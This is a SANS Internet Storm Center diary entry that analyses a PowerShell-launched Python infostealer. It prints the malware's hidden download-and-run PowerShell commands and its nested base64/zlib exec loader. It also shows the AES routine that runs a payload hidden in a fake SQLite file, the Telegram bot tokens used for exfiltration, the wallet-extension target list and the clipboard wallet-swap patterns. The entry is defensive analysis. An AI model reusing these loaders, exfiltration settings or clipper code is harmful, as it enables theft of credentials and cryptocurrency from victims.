---
title: From PowerShell to a Python Obfuscation Race&#x21;, (Wed, Jan 29th)
url: https://isc.sans.edu/diary/rss/31634
source: SANS Internet Storm Center, InfoCON: green
date: 2025-01-30
fetch_date: 2025-10-06T20:14:03.646293
---

# From PowerShell to a Python Obfuscation Race&#x21;, (Wed, Jan 29th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31630)
* [next](/diary/31638)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [From PowerShell to a Python Obfuscation Race!](/forums/diary/From%2BPowerShell%2Bto%2Ba%2BPython%2BObfuscation%2BRace/31634/)

**Published**: 2025-01-29. **Last Updated**: 2025-01-29 08:36:47 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/From%2BPowerShell%2Bto%2Ba%2BPython%2BObfuscation%2BRace/31634/#comments)

Attackers like to mix multiple technologies to improve the deployment of their malicious code. I spotted a small script that drops a Python malware. The file was sent on VirusTotal and got a score of 2/60![[1](https://www.virustotal.com/gui/file/96bb0777a8e9616bc9ca22ca207cf434a947a3e4286c051ed98ddd39147b3c4f/details)] (SHA256:96bb0777a8e9616bc9ca22ca207cf434a947a3e4286c051ed98ddd39147b3c4f). The script starts by downloading and opening a fake Garmin document through Powershell:

![](https://isc.sans.edu/diaryimages/images/isc-20250129-1.png)

```

powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('hxxps://www[.]dropbox[.]com/scl/fi/30nkntkwjho3k60w7q3gu/Garmin_Campaign_Information_for_Partners_V5.docx?rlkey=k1zd9llfafqdqpb6be1rpqlmr&st=rxkezfgo&dl=1', '%TEMP%\\Garmin_Campaign_Information_for_Partners_V5.docx')"
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\\Garmin_Campaign_Information_for_Partners_V5.docx'"
```

Then, it downloads a complete Python environment and unzips it on the victim's computer:

```

powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('hxxps://gitlab[.]com/grr4174450/gar/-/raw/main/fuknewGa1212.zip', 'C:\Users\Public\Document.zip')"
powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"
```

The file "Document.zip" is pretty big (66MB) and contains a Python environment. Once installed, a Python script is launched:

```

powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Document\pythonw.exe C:\Users\Public\Document\DLLs\ld_312.pd clickapp"
```

The file "ld\_312.pd" is pretty simple and will execute a payload that has been compressed and Base64-encoded:

```

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'PyiF59g///7z8X [...] yWzVVwJe'))
```

Once you deobfuscate this, you'll find another payload in reversed strings, compressed and Base64-encode. The funny part is that this technique has been implemented approximately 30(!) times. I stopped counting in Cyberchef. Finally, I got this code:

```

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from base64 import b64decode
import os
count = 0;
key = b'aPIYKiq93v3ES7qf';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                key = b'Eeo2IU0s24TMN0Tc'
def decrypt(ciphertext, key):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(b64decode(ciphertext.encode('utf-8'))) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data.decode('utf-8')
with open(os.path.join(os.path.dirname(__file__), 'LogActiveScutG4.sqlite'), 'r', encoding='utf-8') as file:
    content = file.read()
exec(decrypt(content,key))
```

The next payload is hidden in a fake SQLite database located in Document.zip. It's a classic InfoStealer that uses Telegram for exfiltration:

```

class BotInfo:
    bot_id = 'Scut_1212_Ga-HN'
    tokenbot_default = "7568849705:AAG39FjvCufIGIObX0sHd4-IRAPJvsGfy6c"
    chatid_default = -1002427758677
    tokenbot_startup = "7568849705:AAG39FjvCufIGIObX0sHd4-IRAPJvsGfy6c"
    chatid_startup = -1002466388958
    tokenbot_error = "7938337208:AAG_OU23w7v2ahPVAffIORZ6Ecc__-jAoeU"
    chatid_error = -1002464848676
    chatid_backup = 5184413483
    caption = ""
    host_update = ""
```

Of course, these days, specific attention is paid to crypto wallets. Besides the classic data, this malware looks at many browser extensions:

```

class GetWalletExtension:
    listExtension = {
        'nhbicdelgedinnbcidconlnfeionhbml': 'Begin Wallet',
        'acmacodkjbdgmoleebolmdjonilkdbch': 'Rabby',
        'nhnkbkgjikgcigadomkphalanndcapjk': 'Clover Wallet',
        'cnmamaachppnkjgnildpdmkaakejnhae': 'Auro Wallet',
        'jojhfeoedkpkglbfimdfabpdfjaoolaf': 'Polymesh Wallet',
        'nknhiehlklippafakaeklbeglecifhad': 'Nabox Wallet',
        'ookjlbkiijinhpmnjffcofjonbfbgaoc': 'Temple',
        'dkdedlpgdmmkkfjabffeganieamfklkm': 'Cyano Wallet',
        'cihmoadaighcejopammfbmddcmdekcje': 'LeafWallet',
        'lodccjjbdhfakaekdiahmedfbieldgik': 'DAppPlay',
        'ijmpgkjfkbfhoebgogflfebnmejmfbml': 'BitClip',
        'onofpnbbkehpmmoabgpcpmigafmmnjhl': 'Nash Extension',
        'bcopgchhojmggmffilplmbdicgaihlkp': 'Hycon Lite Client',
        'klnaejjgbibmhlephnhpmaofohgkpgkd': 'ZilPay',
        'algblmhagnobbnmakepomicmfljlbehg': 'ADS Wallet',
        'jccapkebeeiajkkdemacblkjhhhboiek': 'Crust Wallet',
        'agechnindjilpccclelhlbjphbgnobpf': 'Fractal Wallet',
        'jnldfbidonfeldmalbflbmlebbipcnle': 'Bitfinity Wallet',
        'jblndlipeogpafnldhgmapagcccfchpi': 'Kaikas',
        [...]
```

And replace data with the Attacker's wallets (via the clipboard):

```

class FuncCopyCoin:
    patterns = {
        'BTC - Bech32': re.compile(r'^bc1[a-zA-Z0-9]{39,59}$'),
        'ETH': re.compile(r'^0x[a-fA-F0-9]{40}$'),
        'XRP': re.compile(r'^r[a-zA-Z0-9]{24,34}$'),
        'LTC - Bech32': re.compile(r'^ltc1[a-zA-Z0-9]{39,59}$'),
        'TRX': re.compile(r'^T[a-zA-Z0-9]{33}$'),
        'DOGE': re.compile(r'^[D9][a-zA-Z0-9]{33}$'),
        'SOL': re.compile(r'^[1-9A-HJ-NP-Za-km-z]{44}$'),
        'ADA - Bech32': re.compile(r'^addr1[0-9a-zA-Z]{98}$'),
        'TON': re.compile(r'^[EU]Q[A-Za-z0-9_-]{46}$'),
    }

    myWal...